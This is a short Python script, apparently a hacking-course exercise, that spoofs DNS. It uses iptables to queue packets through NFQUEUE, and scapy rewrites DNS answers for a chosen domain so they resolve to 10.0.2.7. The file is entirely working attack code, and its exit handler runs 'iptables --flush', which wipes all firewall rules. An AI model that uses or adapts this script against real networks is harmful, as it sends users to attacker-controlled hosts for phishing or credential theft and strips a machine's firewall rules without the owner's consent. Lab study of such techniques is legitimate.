#! /usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess

def spoof_ip(pac, web):
    spoof = scapy.DNSRR(rrname=web, rdata="10.0.2.7")
    pac[scapy.DNSRR].an = spoof
    pac[scapy.DNSRR].ancount = 1
    del pac[scapy.IP].len
    del pac[scapy.IP].chksum

    del pac[scapy.UDP].len
    del pac[scapy.UDP].chksum
    print("\n\n spoof packet \n\n")
    return pac



def process_pac(packet):
    pac = scapy.IP(packet.get_payload())

    # if pac.haslayer(scapy.DNSQR):
    #     pac[scapy.DNSQR].qname = "www.google.com"
    #     del pac[scapy.IP].len
    #     del pac[scapy.IP].chksum
    #     del pac[scapy.UDP].len
    #     del pac[scapy.UDP].chksum
    #     pac.show()ho 1
    if pac.haslayer(scapy.DNSRR):
        web = pac[scapy.DNSQR].qname
        if "www.yahoo123bc.com" in web:
            got = spoof_ip(pac, web)
            packet.set_payload(str(got))

    packet.accept()

try:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    # subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    que = netfilterqueue.NetfilterQueue()
    que.bind(0, process_pac)
    que.run()

except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)



